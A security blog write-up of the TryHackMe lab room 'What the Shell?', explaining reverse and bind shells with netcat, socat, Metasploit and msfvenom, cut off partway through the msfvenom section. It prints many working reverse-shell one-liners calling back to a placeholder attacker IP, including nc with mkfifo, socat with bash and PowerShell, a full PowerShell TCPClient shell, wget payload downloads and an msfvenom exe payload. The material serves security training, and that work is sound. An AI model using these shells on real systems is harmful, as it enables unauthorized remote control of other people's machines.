<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.0"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Writeup for TryHackMe room - What the Shell?" /><meta name="author" content="4n3i5v74" /><meta property="og:locale" content="en_US" /><meta name="description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><meta property="og:description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><link rel="canonical" href="https://4n3i5v74.github.io/posts/tryhackme-what-the-shell/" /><meta property="og:url" content="https://4n3i5v74.github.io/posts/tryhackme-what-the-shell/" /><meta property="og:site_name" content="4n3i5v74" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-01T00:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Writeup for TryHackMe room - What the Shell?" /><meta name="twitter:site" content="@nive1103" /><meta name="twitter:creator" content="@4n3i5v74" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"4n3i5v74"},"headline":"Writeup for TryHackMe room - What the Shell?","dateModified":"2021-05-13T23:09:48+05:30","datePublished":"2021-04-01T00:00:00+05:30","description":"A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups.","url":"https://4n3i5v74.github.io/posts/tryhackme-what-the-shell/","mainEntityOfPage":{"@type":"WebPage","@id":"https://4n3i5v74.github.io/posts/tryhackme-what-the-shell/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Writeup for TryHackMe room - What the Shell? | 4n3i5v74</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/local.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/copy-code.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">4n3i5v74</a></div><div class="site-subtitle font-italic">A Security Blog.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG â€º <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/4n3i5v74" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span>Posts</span> <span>Writeup for TryHackMe room - What the Shell?</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writeup for TryHackMe room - What the Shell?</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Apr 1, 2021, 12:00 AM +0530" > Apr 1 <i class="unloaded">2021-04-01T00:00:00+05:30</i> </span> by <span class="author"> 4n3i5v74 </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, May 13, 2021, 11:09 PM +0530" > May 13 <i class="unloaded">2021-05-13T23:09:48+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5223 words">29 min</span></div></div><div class="post-content"><div class="flex-container"> <script src="https://tryhackme.com/badge/34685"></script></div><h2 id="what-the-shell"><a href="https://tryhackme.com/room/introtoshells" target="_blank">What the Shell?</a></h2><p>This room contains info about linux shells and methods to use them.</p><p>For complete tryhackme path, refer the <a href="https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/" target="_blank">link</a></p><p>An online reverse shell generator can be found at this <a href="https://www.revshells.com/" target="_blank">link</a></p><h2 id="task-2---tools">Task 2 - Tools</h2><h3 id="references">References</h3><ul><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank">Payload All the Things</a><li><a href="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">Reverse shell CheatSheet</a><li><a href="https://github.com/danielmiessler/SecLists" target="_blank">SecLists Wordlists</a></ul><p>Netcat does all kinds of network interactions, like banner grabbing during enumeration, but more importantly, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques. Exe version is available for windows machines.</p><p>Socat shells are similar to netcat, usually more stable than netcat shells out of the box. The syntax is more difficult, and Netcat is installed on linux by default. Exe version is available for windows machines.</p><p>Metasploit frameworkâ€™s auxiliary/multi/handler module is like socat and netcat. It provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. Itâ€™s also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads.</p><p>Msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. It can generate payloads other than reverse and bind shells.</p><h2 id="task-3---types-of-shell">Task 3 - Types of Shell</h2><p>Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell.</p><p>Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.</p><h2 id="task-5---shell-stabilisation">Task 5 - Shell Stabilisation</h2><h3 id="references-1">References</h3><ul><li><a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true" target="_blank">SOCAT linux binary without dependencies</a><li><a href="https://sourceforge.net/projects/unix-utils/files/socat/" target="_blank">SOCAT windows binary without dependencies</a></ul><p>The following are the methods to use netcat reverse/bind shells.</p><h3 id="method-1---python">Method 1 - Python</h3><p>Mainly for linux targets, as they have python installed by default.</p><p>Get the current terminal settings for row and column size using <code>stty -a</code>.</p><p>Spawn a shell listener using python.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-lnvp%20%3Cport%3E" type="button"></button></div></div><pre><code>nc -lnvp &lt;port&gt;
</code></pre><p>On the target, use the following example to send the reverse shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20%3Clocal-ip%3E%20%3Clocal-port%3E" type="button"></button></div></div><pre><code>nc &lt;local-ip&gt; &lt;local-port&gt;
</code></pre><p>Use <code>python</code> to spawn a <code>bash</code> shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="python%20-c%20'import%20pty;pty.spawn(%22/bin/bash%22)'" type="button"></button></div></div><pre><code>python -c 'import pty;pty.spawn("/bin/bash")'
</code></pre><p>Use <code>TERM</code> settings to give access to few terminal commands like `clear.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="export%20TERM=xterm" type="button"></button></div></div><pre><code>export TERM=xterm
</code></pre><p>Background the shell using <code>ctrl + z</code>. Set <code>echo</code> off in own terminal to pass the echo commands to the reverse/bind shell. This also provides access to tab autocomplete, arrow keys, and Ctrl + C to kill processes. Once done, foreground the process to bring the shell back.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="stty%20raw%20-echo;%20fg" type="button"></button></div></div><pre><code>stty raw -echo; fg
</code></pre><p>Set the terminal row and column size as noted previously using below commands. This helps using editor commands without disrupting the output and shell scroll.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="stty%20rows%20%3Cno%3E%0Astty%20cols%20%3Cno%3E" type="button"></button></div></div><pre><code>stty rows &lt;no&gt;
stty cols &lt;no&gt;
</code></pre><p>Once the reverse/bind shell dies, input in own terminal will not be visible, as <code>echo</code> is turned off. Use <code>reset</code> to bring the settings to default.</p><h3 id="method-2---rlwrap">Method 2 - rlwrap</h3><p>This method brings more stability to windows shells.</p><p>Install the package using <code>apt install rlwrap</code>.</p><p>Get the current terminal settings for row and column size using <code>stty -a</code>.</p><p>Use <code>rlwrap</code> along with <code>netcat</code> to create a slightly stabilised shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rlwrap%20nc%20-lvnp%20%3Cport%3E" type="button"></button></div></div><pre><code>rlwrap nc -lvnp &lt;port&gt;
</code></pre><p>Background the shell using <code>ctrl + z</code>. Set <code>echo</code> off in own terminal to pass the echo commands to the reverse/bind shell. This also provides access to tab autocomplete, arrow keys, and Ctrl + C to kill processes. Once done, foreground the process to bring the shell back.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="stty%20raw%20-echo;%20fg" type="button"></button></div></div><pre><code>stty raw -echo; fg
</code></pre><p>Set the terminal row and column size as noted previously using below commands. This helps using editor commands without disrupting the output and shell scroll.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="stty%20rows%20%3Cno%3E%0Astty%20cols%20%3Cno%3E" type="button"></button></div></div><pre><code>stty rows &lt;no&gt;
stty cols &lt;no&gt;
</code></pre><p>Once the reverse/bind shell dies, input in own terminal will not be visible, as <code>echo</code> is turned off. Use <code>reset</code> to bring the settings to default.</p><h3 id="method-3---socat">Method 3 - socat</h3><p>This method is limited to linux targets.</p><p>Navigate to directory containing socat binary. Use <code>python</code> to create temporary web service to distribute the <code>socat</code> binary.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="python3%20-m%20http.server%2080" type="button"></button></div></div><pre><code>python3 -m http.server 80
</code></pre><p>In the target machine, download the <code>socat</code> binary.</p><p>For linux targets, use command like below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20%3Clocal-ip%3E/socat%20-O%20/tmp/socat" type="button"></button></div></div><pre><code>wget &lt;local-ip&gt;/socat -O /tmp/socat
</code></pre><p>For windows targets, use command like below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="invoke-webrequest%20-uri%20%3Clocal-ip%3E/socat.exe%20-outfile%20c:%5C%5Cwindows%5Ctemp%5Csocat.exe" type="button"></button></div></div><pre><code>invoke-webrequest -uri &lt;local-ip&gt;/socat.exe -outfile c:\\windows\temp\socat.exe
</code></pre><h2 id="task-6---socat">Task 6 - Socat</h2><h3 id="references-2">References</h3><ul><li><a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true" target="_blank">SOCAT linux binary without dependencies</a><li><a href="https://sourceforge.net/projects/unix-utils/files/socat/" target="_blank">SOCAT windows binary without dependencies</a></ul><p>Socat is as a connector between two points. This will essentially be a listening port and the keyboard, it could also be a listening port and a file, or two listening ports. Socat provides a link between two points.</p><p>An example listener command. Use <code>-d -d</code> to turn on debug mode.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20TCP:%3Ctarget-ip%3E:%3Ctarget-port%3E%20-" type="button"></button></div></div><pre><code>socat TCP:&lt;target-ip&gt;:&lt;target-port&gt; -
</code></pre><h3 id="reverse-shell">Reverse shell</h3><p>An example reverse shell for windows targets.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20TCP:%3Cattacker-ip%3E:%3Cattacker-port%3E%20EXEC:powershell.exe,pipes" type="button"></button></div></div><pre><code>socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:powershell.exe,pipes
</code></pre><p>An example reverse shell for linux targets.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20TCP:%3Cattacker-ip%3E:%3Cattacker-port%3E%20EXEC:%22bash%20-li%22" type="button"></button></div></div><pre><code>socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:"bash -li"
</code></pre><h3 id="bind-shell">Bind shell</h3><p>An example bind shell for windows targets.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20TCP-L:%3Cport%3E%20EXEC:powershell.exe,pipes" type="button"></button></div></div><pre><code>socat TCP-L:&lt;port&gt; EXEC:powershell.exe,pipes
</code></pre><p>An example bind shell for linux targets.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20TCP-L:%3Cport%3E%20EXEC:%22bash%20-li%22" type="button"></button></div></div><pre><code>socat TCP-L:&lt;port&gt; EXEC:"bash -li"
</code></pre><h3 id="stabilising">Stabilising</h3><p>An example to stabilise the <code>socat</code> shell listener from attaching machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20TCP-L:%3Cport%3E%20FILE:%60tty%60,raw,echo=0" type="button"></button></div></div><pre><code>socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0
</code></pre><p>An example to stabilise the <code>socat</code> shell from linux target machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20TCP:%3Cattacker-ip%3E:%3Cattacker-port%3E%20EXEC:%22bash%20-li%22,pty,stderr,sigint,setsid,sane" type="button"></button></div></div><pre><code>socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:"bash -li",pty,stderr,sigint,setsid,sane
</code></pre><p>From the above command, the description for options are as follows.</p><ul><li>pty - allocates a pseudoterminal on the target<li>stderr - error messages shown in the shell<li>sigint - passes Ctrl + C commands through sub-process, allowing us to kill commands inside the shell<li>setsid - creates the process in a new session<li>sane - stabilises the terminal</ul><h2 id="task-7---socat-encrypted-shells">Task 7 - Socat Encrypted Shells</h2><p>To use encrypted communication, generate a certificate and key file. The inputs asked during generation can be given or left empty. Create <code>pem</code> file from the resulting <code>crt</code> and <code>key</code> file, for use in <code>socat</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="openssl%20req%20--newkey%20rsa:2048%20-nodes%20-keyout%20shell.key%20-x509%20-days%20362%20-out%20shell.crt%0Acat%20shell.key%20shell.crt%20%3E%20shell.pem" type="button"></button></div></div><pre><code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt &gt; shell.pem
</code></pre><p>An example of <code>reverse shell</code> implementation of <code>socat</code> is as below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20OPENSSL-LISTEN:%3Cport%3E,cert=shell.pem,verify=0%20-%0Asocat%20OPENSSL:%3Clocal-ip%3E:%3Clocal-port%3E,verify=0%20EXEC:/bin/bash" type="button"></button></div></div><pre><code>socat OPENSSL-LISTEN:&lt;port&gt;,cert=shell.pem,verify=0 -
socat OPENSSL:&lt;local-ip&gt;:&lt;local-port&gt;,verify=0 EXEC:/bin/bash
</code></pre><p>An example of <code>bind shell</code> implementation of <code>socat</code> is as below. <code>Bind shell</code> implementation requires the <code>pem</code> file to be present at the target.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20OPENSSL:%3Ctarget-ip%3E:%3Ctarget-port%3E,verify=0%20-%0Asocat%20OPENSSL-LISTEN:%3Cport%3E,cert=shell.pem,verify=0%20EXEC:cmd.exe,pipes" type="button"></button></div></div><pre><code>socat OPENSSL:&lt;target-ip&gt;:&lt;target-port&gt;,verify=0 -
socat OPENSSL-LISTEN:&lt;port&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
</code></pre><p>An example syntax for openssl listener on port 53 with encrypt.pem file is as below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20openssl-listen:53,cert=encrypt.pem,verify=0%20FILE;%60tty%60,raw,echo=0" type="button"></button></div></div><pre><code>socat openssl-listen:53,cert=encrypt.pem,verify=0 FILE;`tty`,raw,echo=0
</code></pre><p>An example syntax for connecting to 10.10.10.5 back to listener is as below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20openssl:10.10.10.5:53,verify=0%20exec:%22bash%20-li%22,pty,stderr,sigint,setsid,sane" type="button"></button></div></div><pre><code>socat openssl:10.10.10.5:53,verify=0 exec:"bash -li",pty,stderr,sigint,setsid,sane
</code></pre><h2 id="task-8---common-shell-payloads">Task 8 - Common Shell Payloads</h2><h3 id="references-3">References</h3><ul><li><a href="https://www.linuxjournal.com/article/2156" target="_blank">Named pipes</a><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank">PayloadAllTheThings Repo</a></ul><p>Few versions of <code>netcat</code>, including ones in kali <code>netcat-traditional</code> and <code>/usr/share/windows-resources/binaries</code>, there is an option <code>-e</code> to specify process to be executed upon connection. This is not included in default versions of netcat as it is seen insecure.</p><p>The following example provides shell on target with <code>bash</code>. The first command provides <code>bind shell</code> and second command provides <code>reverse shell</code></p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-lvnp%20%3Cport%3E%20-e%20/bin/bash%0Anc%20%3Clocal-ip%3E%20%3Cport%3E%20-e%20/bin/bash" type="button"></button></div></div><pre><code>nc -lvnp &lt;port&gt; -e /bin/bash
nc &lt;local-ip&gt; &lt;port&gt; -e /bin/bash
</code></pre><p>An alternate method to create reverse/bind shell listener with <code>bash</code> without using <code>-e</code> option of <code>netcat</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="mkfifo%20/tmp/f;%20nc%20-lvnp%20%3Cport%3E%20%3C%20/tmp/f%20%7C%20/bin/sh%20%3E/tmp/f%202%3E&amp;1%20;%20rm%20/tmp/f%0Amkfifo%20/tmp/f;%20nc%20%3Clocal-ip%3E%20%3Cport%3E%20%3C%20/tmp/f%20%7C%20/bin/sh%20%3E/tmp/f%202%3E&amp;1%20;%20rm%20/tmp/f" type="button"></button></div></div><pre><code>mkfifo /tmp/f; nc -lvnp &lt;port&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1 ; rm /tmp/f
mkfifo /tmp/f; nc &lt;local-ip&gt; &lt;port&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1 ; rm /tmp/f
</code></pre><h3 id="powershell-listener">Powershell listener</h3><p>The following is a one-liner to be used in <code>cmd</code> which invokes a <code>reverse shell</code> from target.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="powershell%20-c%20%22$client%20=%20New-Object%20System.Net.Sockets.TCPClient('%3Cip%3E',%3Cport%3E);$stream%20=%20$client.GetStream();[byte[]]$bytes%20=%200..65535%7C%25%7B0%7D;while(($i%20=%20$stream.Read($bytes,%200,%20$bytes.Length))%20-ne%200)%7B;$data%20=%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes,0,%20$i);$sendback%20=%20(iex%20$data%202%3E&amp;1%20%7C%20Out-String%20);$sendback2%20=%20$sendback%20+%20'PS%20'%20+%20(pwd).Path%20+%20'%3E%20';$sendbyte%20=%20([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()%7D;$client.Close()%22" type="button"></button></div></div><pre><code>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
</code></pre><h2 id="task-9---msfvenom">Task 9 - msfvenom</h2><p>Msfvenom is used to generate code for reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit. It can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py).</p><p>An example syntax to generate reverse shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msfvenom%20-p%20windows/x64/shell/reverse_tcp%20-f%20exe%20-o%20shell.exe%20LHOST=%3Clisten-ip%3E%20LPORT=%3Clisten-port%3E" type="button"></button></div></div><pre><code>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-ip&gt; LPORT=&lt;listen-port&gt;
</code></pre><p>Types of payload</p><ul><li><code>Staged payloads</code> are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the target. It connects back to a waiting listener, but doesnâ€™t actually contain any reverse shell code. It connects to the listener and downloads the actual payload. The payload is split into two parts - a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener, usually the Metasploit multi/handler.<li><code>Stageless payloads</code> are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.</ul><p>Meterpreter shells are Metasploitâ€™s own brand of fully-featured shell. They are completely stable and have a lot of inbuilt functionality, such as file uploads and downloads. If any of Metasploitâ€™s post-exploitation tools are needed, then meterpreter shell should be used. The downside to meterpreter shells is that they must be caught in Metasploit.</p><h3 id="payload-naming-conventions">Payload naming conventions</h3><p>The payloads are named in the convention, 